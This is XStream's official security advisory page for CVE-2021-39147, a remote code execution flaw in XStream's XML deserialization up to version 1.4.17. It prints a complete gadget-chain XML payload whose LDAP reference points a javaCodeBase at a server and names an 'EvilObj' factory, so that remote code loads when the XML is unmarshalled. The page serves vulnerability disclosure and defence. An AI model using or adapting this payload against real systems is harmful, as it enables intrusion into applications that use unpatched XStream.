<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<!--
 Copyright (C) 2005, 2006 Joe Walnes.
 Copyright (C) 2006, 2007, 2008, 2021 XStream committers.
 All rights reserved.
 
 The software in this package is published under the terms of the BSD
 style license a copy of which has been included with this distribution in
 the LICENSE.txt file.
 
 Created on 29. January 2005 by Joe Walnes
 -->
    <head>
        <title>XStream - CVE-2021-39147</title>
        <link rel="stylesheet" type="text/css" href="style.css"/>
        
    
  

        <!-- Google analytics -->
        <script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
        </script>
        <script type="text/javascript">
          _uacct = "UA-110973-2";
          urchinTracker();
        </script>

    </head>
    <body>

        <div id="banner">
            <a href="index.html"><img id="logo" src="logo.gif" alt="XStream"/></a>
        </div>

        <div id="center" class="Content2Column">  <!-- Content3Column for index -->
            <div id="content">
                <h1 class="FirstChild">CVE-2021-39147</h1>

                

    <h2 id="vulnerability">Vulnerability</h2>
    
    <p>CVE-2021-39147: XStream is vulnerable to an Arbitrary Code Execution attack.</p>
    
    <h2 id="affected_versions">Affected Versions</h2>
    
    <p>All versions until and including version 1.4.17 are affected, if using the version out of the box.  No user is
    affected, who followed the recommendation to setup <a href="security.html#framework">XStream's security framework
    </a> with a whitelist limited to the minimal required    types.</p>

    <h2 id="description">Description</h2>
    
    <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.
    XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed
    input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>

    <h2 id="reproduction">Steps to Reproduce</h2>

    <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and
    unmarshal it again with XStream:</p>
<div class="Source XML"><pre>&lt;sorted-set&gt;
  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
    &lt;type&gt;ysomap&lt;/type&gt;
    &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;
      &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;
        &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;
        &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;
        &lt;bodyParts/&gt;
        &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
          &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;
          &lt;multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'&gt;
            &lt;soapPart/&gt;
            &lt;mm&gt;
              &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;
                &lt;aliases class='com.sun.jndi.ldap.LdapSearchEnumeration'&gt;
                  &lt;listArg class='javax.naming.CompoundName' serialization='custom'&gt;
                    &lt;javax.naming.CompoundName&gt;
                      &lt;properties/&gt;
                      &lt;int&gt;1&lt;/int&gt;
                      &lt;string&gt;ysomap&lt;/string&gt;
                    &lt;/javax.naming.CompoundName&gt;
                  &lt;/listArg&gt;
                  &lt;cleaned&gt;false&lt;/cleaned&gt;
                  &lt;res&gt;
                    &lt;msgId&gt;0&lt;/msgId&gt;
                    &lt;status&gt;0&lt;/status&gt;
                  &lt;/res&gt;
                  &lt;enumClnt&gt;
                    &lt;isLdapv3&gt;false&lt;/isLdapv3&gt;
                    &lt;referenceCount&gt;0&lt;/referenceCount&gt;
                    &lt;pooled&gt;false&lt;/pooled&gt;
                    &lt;authenticateCalled&gt;false&lt;/authenticateCalled&gt;
                  &lt;/enumClnt&gt;
                  &lt;limit&gt;1&lt;/limit&gt;
                  &lt;posn&gt;0&lt;/posn&gt;
                  &lt;homeCtx&gt;
                    &lt;__contextType&gt;0&lt;/__contextType&gt;
                    &lt;port__number&gt;1099&lt;/port__number&gt;
                    &lt;hostname&gt;127.0.0.1&lt;/hostname&gt;
                    &lt;clnt reference='../../enumClnt'/&gt;
                    &lt;handleReferrals&gt;0&lt;/handleReferrals&gt;
                    &lt;hasLdapsScheme&gt;true&lt;/hasLdapsScheme&gt;
                    &lt;netscapeSchemaBug&gt;false&lt;/netscapeSchemaBug&gt;
                    &lt;referralHopLimit&gt;0&lt;/referralHopLimit&gt;
                    &lt;batchSize&gt;0&lt;/batchSize&gt;
                    &lt;deleteRDN&gt;false&lt;/deleteRDN&gt;
                    &lt;typesOnly&gt;false&lt;/typesOnly&gt;
                    &lt;derefAliases&gt;0&lt;/derefAliases&gt;
                    &lt;addrEncodingSeparator/&gt;
                    &lt;connectTimeout&gt;0&lt;/connectTimeout&gt;
                    &lt;readTimeout&gt;0&lt;/readTimeout&gt;
                    &lt;waitForReply&gt;false&lt;/waitForReply&gt;
                    &lt;replyQueueSize&gt;0&lt;/replyQueueSize&gt;
                    &lt;useSsl&gt;false&lt;/useSsl&gt;
                    &lt;useDefaultPortNumber&gt;false&lt;/useDefaultPortNumber&gt;
                    &lt;parentIsLdapCtx&gt;false&lt;/parentIsLdapCtx&gt;
                    &lt;hopCount&gt;0&lt;/hopCount&gt;
                    &lt;unsolicited&gt;false&lt;/unsolicited&gt;
                    &lt;sharable&gt;false&lt;/sharable&gt;
                    &lt;enumCount&gt;1&lt;/enumCount&gt;
                    &lt;closeRequested&gt;false&lt;/closeRequested&gt;
                  &lt;/homeCtx&gt;
                  &lt;more&gt;true&lt;/more&gt;
                  &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;
                  &lt;startName class='javax.naming.ldap.LdapName' serialization='custom'&gt;
                    &lt;javax.naming.ldap.LdapName&gt;
                      &lt;default/&gt;
                      &lt;string&gt;uid=ysomap,ou=oa,dc=example,dc=com&lt;/string&gt;
                    &lt;/javax.naming.ldap.LdapName&gt;
                  &lt;/startName&gt;
                  &lt;searchArgs&gt;
                    &lt;name class='javax.naming.CompoundName' reference='../../listArg'/&gt;
                    &lt;filter&gt;ysomap&lt;/filter&gt;
                    &lt;cons&gt;
                      &lt;searchScope&gt;1&lt;/searchScope&gt;
                      &lt;timeLimit&gt;0&lt;/timeLimit&gt;
                      &lt;derefLink&gt;false&lt;/derefLink&gt;
                      &lt;returnObj&gt;true&lt;/returnObj&gt;
                      &lt;countLimit&gt;0&lt;/countLimit&gt;
                    &lt;/cons&gt;
                    &lt;reqAttrs/&gt;
                  &lt;/searchArgs&gt;
                  &lt;entries&gt;
                    &lt;com.sun.jndi.ldap.LdapEntry&gt;
                      &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;
                      &lt;attributes class='javax.naming.directory.BasicAttributes' serialization='custom'&gt;
                        &lt;default&gt;
                          &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;
                        &lt;/default&gt;
                        &lt;int&gt;4&lt;/int&gt;
                        &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;
                          &lt;javax.naming.directory.BasicAttribute&gt;
                            &lt;default&gt;
                              &lt;ordered&gt;false&lt;/ordered&gt;
                              &lt;attrID&gt;objectClass&lt;/attrID&gt;
                            &lt;/default&gt;
                            &lt;int&gt;1&lt;/int&gt;
                            &lt;string&gt;javaNamingReference&lt;/string&gt;
                          &lt;/javax.naming.directory.BasicAttribute&gt;
                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;
                            &lt;default&gt;
                              &lt;rdn class=''javax.naming.CompositeName'' serialization=''custom''&gt;
                                &lt;javax.naming.CompositeName&gt;
                                  &lt;int&gt;0&lt;/int&gt;
                                &lt;/javax.naming.CompositeName&gt;
                              &lt;/rdn&gt;
                            &lt;/default&gt;
                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;
                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;
                        &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;
                          &lt;javax.naming.directory.BasicAttribute&gt;
                            &lt;default&gt;
                              &lt;ordered&gt;false&lt;/ordered&gt;
                              &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;
                            &lt;/default&gt;
                            &lt;int&gt;1&lt;/int&gt;
                            &lt;string&gt;http://127.0.0.1/&lt;/string&gt;
                          &lt;/javax.naming.directory.BasicAttribute&gt;
                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;
                            &lt;default&gt;
                              &lt;rdn class=''javax.naming.CompositeName'' serialization=''custom''&gt;
                                &lt;javax.naming.CompositeName&gt;
                                  &lt;int&gt;0&lt;/int&gt;
                                &lt;/javax.naming.CompositeName&gt;
                              &lt;/rdn&gt;
                            &lt;/default&gt;
                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;
                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;
                        &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;
                          &lt;javax.naming.directory.BasicAttribute&gt;
                            &lt;default&gt;
                              &lt;ordered&gt;false&lt;/ordered&gt;
                              &lt;attrID&gt;javaClassName&lt;/attrID&gt;
                            &lt;/default&gt;
                            &lt;int&gt;1&lt;/int&gt;
                            &lt;string&gt;foo&lt;/string&gt;
                          &lt;/javax.naming.directory.BasicAttribute&gt;
                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;
                            &lt;default&gt;
                              &lt;rdn class=''javax.naming.CompositeName'' serialization=''custom''&gt;
                                &lt;javax.naming.CompositeName&gt;
                                  &lt;int&gt;0&lt;/int&gt;
                                &lt;/javax.naming.CompositeName&gt;
                              &lt;/rdn&gt;
                            &lt;/default&gt;
                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;
                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;
                        &lt;com.sun.jndi.ldap.LdapAttribute serialization='custom'&gt;
                          &lt;javax.naming.directory.BasicAttribute&gt;
                            &lt;default&gt;
                              &lt;ordered&gt;false&lt;/ordered&gt;
                              &lt;attrID&gt;javaFactory&lt;/attrID&gt;
                            &lt;/default&gt;
                            &lt;int&gt;1&lt;/int&gt;
                            &lt;string&gt;EvilObj&lt;/string&gt;
                          &lt;/javax.naming.directory.BasicAttribute&gt;
                          &lt;com.sun.jndi.ldap.LdapAttribute&gt;
                            &lt;default&gt;
                              &lt;rdn class=''javax.naming.CompositeName'' serialization=''custom''&gt;
                                &lt;javax.naming.CompositeName&gt;
                                  &lt;int&gt;0&lt;/int&gt;
                                &lt;/javax.naming.CompositeName&gt;
                              &lt;/rdn&gt;
                            &lt;/default&gt;
                          &lt;/com.sun.jndi.ldap.LdapAttribute&gt;
                        &lt;/com.sun.jndi.ldap.LdapAttribute&gt;
                      &lt;/attributes&gt;
                    &lt;/com.sun.jndi.ldap.LdapEntry&gt;
                  &lt;/entries&gt;
                &lt;/aliases&gt;
              &lt;/it&gt;
            &lt;/mm&gt;
          &lt;/multiPart&gt;
        &lt;/sm&gt;
      &lt;/message&gt;
    &lt;/value&gt;
  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
    &lt;type&gt;ysomap&lt;/type&gt;
    &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;
      &lt;m__obj class='string'&gt;test&lt;/m__obj&gt;
    &lt;/value&gt;
  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
&lt;/sorted-set&gt;
</pre></div>
<div class="Source Java"><pre>XStream xstream = new XStream();
xstream.fromXML(xml);
</pre></div>

    <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>

    <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>

    <h2 id="impact">Impact</h2>

    <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed
    input stream.</p>

    <h2 id="workarounds">Workarounds</h2>

    <p>See <a href="security.html#workaround">workarounds</a> for the different versions covering all CVEs.</p>

    <h2 id="credits">Credits</h2>
    
    <p>wh1t3p1g from TSRC (Tencent Security Response Center) found and reported the issue to XStream and provided the
	required information to reproduce it.</p>
    
      

                <br/>

            </div>
        </div>

        <div class="SidePanel" id="left">
                    <div class="MenuGroup">
                        <h1>Software</h1>
                        <ul>
                                    <li><a href="index.html">About XStream</a></li>
                                    <li><a href="news.html">News</a></li>
                                    <li><a href="changes.html">Change History</a></li>
                                    <li><a href="security.html">Security Aspects</a></li>
                                    <li><a href="versioning.html">About Versioning</a></li>
                        </ul>
                    </div>
                    <div class="MenuGroup">
                        <h1>Evaluating XStream</h1>
                        <ul>
                                    <li><a href="tutorial.html">Two Minute Tutorial</a></li>
                                    <li><a href="license.html">License</a></li>
                                    <li><a href="download.html">Download</a></li>
                                    <li><a href="references.html">References</a></li>
                                    <li><a href="benchmarks.html">Benchmarks</a></li>
                                    <li><a href="https://www.openhub.net/p/xstream">Code Statistics</a></li>
                        </ul>
                    </div>
                    <div class="MenuGroup">
                        <h1>Using XStream</h1>
                        <ul>
                                    <li><a href="architecture.html">Architecture Overview</a></li>
                                    <li><a href="graphs.html">Object references</a></li>
                                    <li><a href="manual-tweaking-output.html">Tweaking the Output</a></li>
                                    <li><a href="converters.html">Converters</a></li>
                                    <li><a href="faq.html">Frequently Asked Questions</a></li>
                                    <li><a href="mailing-lists.html">Mailing Lists</a></li>
                                    <li><a href="issues.html">Reporting Issues</a></li>
                        </ul>
                    </div>
                    <div class="MenuGroup">
                        <h1>Javadoc</h1>
                        <ul>
                                    <li><a href="javadoc/index.html">XStream Core</a></li>
                                    <li><a href="hibernate-javadoc/index.html">Hibernate Extensions</a></li>
                                    <li><a href="jmh-javadoc/index.html">JMH Module</a></li>
                        </ul>
                    </div>
                    <div class="MenuGroup">
                        <h1>Tutorials</h1>
                        <ul>
                                    <li><a href="tutorial.html">Two Minute Tutorial</a></li>
                                    <li><a href="alias-tutorial.html">Alias Tutorial</a></li>
                                    <li><a href="annotations-tutorial.html">Annotations Tutorial</a></li>
                                    <li><a href="converter-tutorial.html">Converter Tutorial</a></li>
                                    <li><a href="objectstream.html">Object Streams Tutorial</a></li>
                                    <li><a href="persistence-tutorial.html">Persistence API Tutorial</a></li>
                                    <li><a href="json-tutorial.html">JSON Tutorial</a></li>
                                    <li><a href="http://www.studytrails.com/java/xml/xstream/xstream-introduction.jsp">StudyTrails</a></li>
                        </ul>
                    </div>
                    <div class="MenuGroup">
                        <h1>Developing XStream</h1>
                        <ul>
                                    <li><a href="how-to-contribute.html">How to Contribute</a></li>
                                    <li><a href="team.html">Development Team</a></li>
                                    <li><a href="repository.html">Source Repository</a></li>
                                    <li><a href="https://travis-ci.org/x-stream/xstream/branches">Continuous Integration</a></li>
                        </ul>
                    </div>
        </div>

  </body>
</html>
